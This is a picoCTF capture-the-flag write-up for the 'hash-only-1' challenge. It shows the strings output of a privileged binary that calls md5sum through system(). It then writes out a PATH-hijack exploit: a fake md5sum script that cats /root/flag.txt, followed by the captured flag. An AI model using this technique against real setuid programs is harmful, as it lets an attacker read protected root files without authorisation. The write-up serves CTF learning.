# hash-only-1


## Challenge Category - Binary Exploitation


### Challenge Description

Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
Connect using ssh ctf-player@shape-facility.picoctf.net -p 51822 with the password, a15d25e1 and run the binary named "flaghasher".
You can get a copy of the binary if you wish: scp -P 51822 ctf-player@shape-facility.picoctf.net:~/flaghasher 

### Solution

I connected the program with the given password and entered the password and ran the flagslasher command as mentioned and it showed something like this (after running the string command)


```bash

strings: 'flagslagsher': No such file
ctf-player@pico-chall$ strings flaghasher
/lib64/ld-linux-x86-64.so.2
z`+Ep
'0x${
libstdc++.so.6
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
_ZNSolsEi
_ZNSaIcED1Ev
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_
_ZNSt8ios_base4InitD1Ev
_ZNSolsEPFRSoS_E
_ZSt4cerr
__gxx_personality_v0
_ZNSaIcEC1Ev
_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
_ZNSt8ios_base4InitC1Ev
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev
_ZSt4cout
libgcc_s.so.1
_Unwind_Resume
libc.so.6
setuid
__stack_chk_fail
__cxa_atexit
system
sleep
__cxa_finalize
setgid
__libc_start_main
GCC_3.0
GLIBC_2.4
GLIBC_2.2.5
CXXABI_1.3
GLIBCXX_3.4
GLIBCXX_3.4.21
u+UH
[]A\A]A^A_
Computing the MD5 hash of /root/flag.txt....
/bin/bash -c 'md5sum /root/flag.txt'
Error: system() call returned non-zero value:
:*3$"
zPLR
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8061
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
src.cpp
_ZStL19piecewise_construct
_ZStL8__ioinit
_Z41__static_initialization_and_destruction_0ii
_GLOBAL__sub_I_main
__FRAME_END__
__GNU_EH_FRAME_HDR
_DYNAMIC
__init_array_end
__init_array_start
_GLOBAL_OFFSET_TABLE_
_edata
_IO_stdin_used
_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv@@GLIBCXX_3.4.21
__cxa_finalize@@GLIBC_2.2.5
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_@@GLIBCXX_3.4
__dso_handle
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEED1Ev@@GLIBCXX_3.4.21
DW.ref.__gxx_personality_v0
sleep@@GLIBC_2.2.5
system@@GLIBC_2.2.5
__cxa_atexit@@GLIBC_2.2.5
_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc@@GLIBCXX_3.4
_ZNSolsEPFRSoS_E@@GLIBCXX_3.4
_ZNSaIcED1Ev@@GLIBCXX_3.4
__stack_chk_fail@@GLIBC_2.4
__TMC_END__
_ZSt4cout@@GLIBCXX_3.4
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1EPKcRKS3_@@GLIBCXX_3.4.21
__data_start
__bss_start
_ZNSt8ios_base4InitC1Ev@@GLIBCXX_3.4
__libc_csu_init
__gxx_personality_v0@@CXXABI_1.3
_ZNSolsEi@@GLIBCXX_3.4
_ITM_deregisterTMCloneTable
_Unwind_Resume@@GCC_3.0
_ZNSaIcEC1Ev@@GLIBCXX_3.4
setgid@@GLIBC_2.2.5
__libc_csu_fini
__libc_start_main@@GLIBC_2.2.5
__gmon_start__
setuid@@GLIBC_2.2.5
_ITM_registerTMCloneTable
_ZSt4cerr@@GLIBCXX_3.4
_ZNSt8ios_base4InitD1Ev@@GLIBCXX_3.4
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.gcc_except_table
.init_array
.fini_array
.dynamic
.data
.bss
.comment
ctf-player@pico-chall$
```
I ran the strings command so i could see how the binary works

I tried the ```md5sum /root/flag.txt ``` command but it said "Permission Denied" . It was now obvious that i have to manipulate the mdsum command to make it
print the contents of the flag.txt file , I looked around ways on the internet on how to bypass it and i found a way to trick it to use whatever and however i want
by modifying `PATH` Environment variable , for that I created a custom script named `md5sum` and made it executable 


```bash
.comment
ctf-player@pico-chall$ md5sum /root/flag.txt
md5sum: /root/flag.txt: Permission denied
ctf-player@pico-chall$ mkdir ~/fakebin
ctf-player@pico-chall$ nano ~/fakebin/md5sum
-bash: nano: command not found
ctf-player@pico-chall$ vi ~/fakebin/md5sum
-bash: vi: command not found
ctf-player@pico-chall$ vi ~/fakebin/md5sum
-bash: vi: command not found
ctf-player@pico-chall$ echo -e '#!/bin/bash\ncat /root/flag.txt' > ~/fakebin/md5sum
ctf-player@pico-chall$ chmod +x ~/fakebin/md5sum

```
Then I ran the binary after making sure the file runs on this PATH only by using the export PATH command and I got the flag

```bash

ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....

picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_9722baa4}ctf-player@pico-chall$ Connection to shape-facility.picoctf.net closed by remote host.
Connection to shape-facility.picoctf.net closed.

```

Hence Solved xd
